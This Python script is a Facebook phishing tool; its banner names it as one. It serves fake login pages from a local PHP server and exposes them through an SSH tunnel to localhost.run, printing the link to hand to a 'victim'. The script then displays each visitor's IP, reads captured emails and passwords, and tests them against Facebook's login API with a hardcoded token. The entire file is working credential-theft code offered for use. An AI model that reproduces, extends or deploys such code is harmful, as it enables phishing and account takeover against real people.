import os
import subprocess
from subprocess import PIPE, DEVNULL
import sys
import time
import requests
ip_tries = 0
if os.path.exists(os.path.join("normal", 'cred.txt')):
    os.remove(os.path.join("normal", 'cred.txt'))
    
if os.path.exists(os.path.join("normal", 'ip.txt')):
    os.remove(os.path.join("normal", 'ip.txt'))
    
if os.path.exists(os.path.join("security", 'cred.txt')):
    os.remove(os.path.join("security", 'cred.txt'))
    
if os.path.exists(os.path.join("security", 'ip.txt')):
    os.remove(os.path.join("security", 'ip.txt'))

def _colored(text, color):
    ansi_codes = {
        'black': '\033[30m',
        'red': '\033[31m',
        'green': '\033[32m',
        'yellow': '\033[33m',
        'blue': '\033[34m',
        'magenta': '\033[35m',
        'cyan': '\033[36m',
        'white': '\033[37m',
        'reset': '\033[0m'
    }

    color_code = ansi_codes.get(color.lower(), ansi_codes['reset'])
    return f"{color_code}{text}{ansi_codes['reset']}"


def check_account(email, password):
    url = (
        "https://b-api.facebook.com/method/auth.login?"
        "access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1"
        "&format=json&sdk_version=1&email={email}&locale=en_US"
        "&password={password}&sdk=ios&generate_session_cookies=1"
        "&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
    ).format(email=email, password=password)

    try:
        response = requests.get(url)
        response.raise_for_status()
        return "is_account_confirmed" in response.text or "Account Temporarily Unavailable" in response.text
    except requests.RequestException as e:
        print(_colored(f"Error during account check: {e}", "red"))
        return False


def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
    try:
        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
    except Exception as e:
        print("Eddor")

def print_banner():
    os.system("clear" if os.name == "posix" else "cls")
    print(_colored("═════════════════════════════════════════════", "green"))
    print(_colored("""d8888b. db   db        d88888b d8888b. 
88  `8D 88   88        88'     88  `8D 
88oodD' 88ooo88        88ooo   88oooY' 
88~~~   88~~~88 C8888D 88~~~   88~~~b. 
88      88   88        88      88   8D 
88      YP   YP        YP      Y8888P'""", "green"))
    print(_colored("═════════════════════════════════════════════", "green"))
    print(_colored("OWNER :", "yellow"),_colored("RAHMATULLAH", "yellow"))
    print(_colored("TOOL  :", "yellow"),_colored("FACEBOOK PHISHING", "yellow"))
    print(_colored("STATUS:", "yellow"),_colored("PREMIUM", "RED"))
    print(_colored("═════════════════════════════════════════════", "green"))
    print()


def select_option():
    print(_colored("[1] FACEBOOK NORMAL", "green"))
    print(_colored("[2] FACEBOOK SECURITY", "green"))
    print()
    menu_select = input(_colored("Enter the number: ", "green")).strip()
    if menu_select in ['1', '01', 'a', 'A']:
        return 1
    elif menu_select in ['2', '02', 'b', 'B']:
        return 2
    else:
        print(_colored("INVALID INPUT!", "red"))
        input(_colored("Press Enter to continue ...", "green"))
        return select_option()


def server_path():
    print("Select a server from below:")
    print()
    print(_colored("[1] SERVEO (RECOMMENDED)", "green"))
    print(_colored("[2] CLOUDFLARE (URL BAN)", "green"))
    print()
    server_num = input(_colored("Enter a number: ", "green")).strip()
    if server_num in ['1', '01', 'a', 'A']:
        return 1
    elif server_num in ['2', '02', 'b', 'B']:
        return 2
    else:
        print(_colored("INVALID INPUT!", "red"))
        input(_colored("Press Enter to continue ...", "green"))
        return server_path()


def handle_verification(folder):
    cred_file = os.path.join(folder, 'cred.txt')
    veri_file = os.path.join(folder, 'veri.txt')
    ip_file = os.path.join(folder, 'ip.txt')
    
    if os.path.exists(ip_file) and ip_tries == 0:
        with open(ip_file, 'r') as file:
            ip_info = file.read()
            print(_colored("SOME ONE HAS CLICKED THE LINK!! INFO:", "red"),"\n")
            print(_colored("══════════════", "green"))
            print(ip_info)
            print(_colored("══════════════", "green"))
        os.remove(ip_file)
        ip_tries = 1
    
    if os.path.exists(cred_file):
        email, password = None, None
        with open(cred_file, 'r') as file:
            for line in file:
                key, value = line.strip().split('=', 1)
                if key == 'email':
                    email = value
                elif key == 'pass':
                    password = value
        os.remove(cred_file)
        if email and password:
            if not check_account(email, password):
            #                  ════════════════════════════ 
                print("\033[31m════════════════════════════\033[0m")
                print(f"\033[31mUSER: {email}\033[0m")
                print(f"\033[31mPASS: {password}\033[0m")
                print("\033[31m════════════════════════════\033[0m")
                
                with open(veri_file, 'w') as f:
                    f.write('verify=no')
            else:
                print(_colored("════════════════════════════", "green"))
                print(_colored(f"USER: {email}", "green"))
                print(_colored(f"PASS: {password}", "green"))
                print(_colored("════════════════════════════", "green"))
                input("Press Enter to continue...")
                with open(veri_file, 'w') as f:
                    f.write('verify=true')
                sys.exit(0)


def serveo():
    command = f"ssh -R 80:localhost:3333 localhost.run"
    
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    localhost_run_url = None

    # Iterate over the output lines
    for line in process.stdout:
        # Check if the line contains 'tunneled with tls termination,'
        if "tunneled with tls termination," in line:
            # Extract the URL part from the line
            parts = line.strip().split(" ")
            for part in parts:
                if part.startswith("https://"):
                    localhost_run_url = part
                    break
            if localhost_run_url:
                break  # Stop after finding the correct URL

    # Return the URL and the process handle
    print(_colored(f"Give this link to victim: {localhost_run_url}", "green"))
def php_server(directory, port=3333):
    php_command = ["php", "-S", f"localhost:{port}", "-t", directory]
    php_server = subprocess.Popen(php_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    time.sleep(2)  # Wait a moment to ensure the server has started
    return php_server


def main():
    
    if input(_colored("Enter the username: ", "yellow")) in ["rahmatullah", "RAHMATULLAH", "rh", "RH"]:
        if input(_colored("Enter the password: ", "yellow")) in ["rahmatullah", "RAHMATULLAH", "rh", "RH"]:
            pass
        else:
            print(_colored("WRONG PASSWORD!!", "red"))
            sys.exit(0)
    else:
        print(_colored("USER NOT FOUND!!", "red"))
        sys.exit(0)
    
    
    
    print_banner()
    path = select_option()
    srv_num = server_path()
    
    if path == 1:
        php_server = php_server("normal/", port=3333)
    elif path == 2:
        php_server = php_server("security/", port=3333)
    
    if srv_num == 1:
        serveo()
    elif srv_num == 2:
        print("Currently under development...")
        input("Press Enter to continue ...")
        return
    
    if path == 1:
        while True:
            handle_verification('normal')
    elif path == 2:
        while True:
            handle_verification('security')


if __name__ == "__main__":
    main()
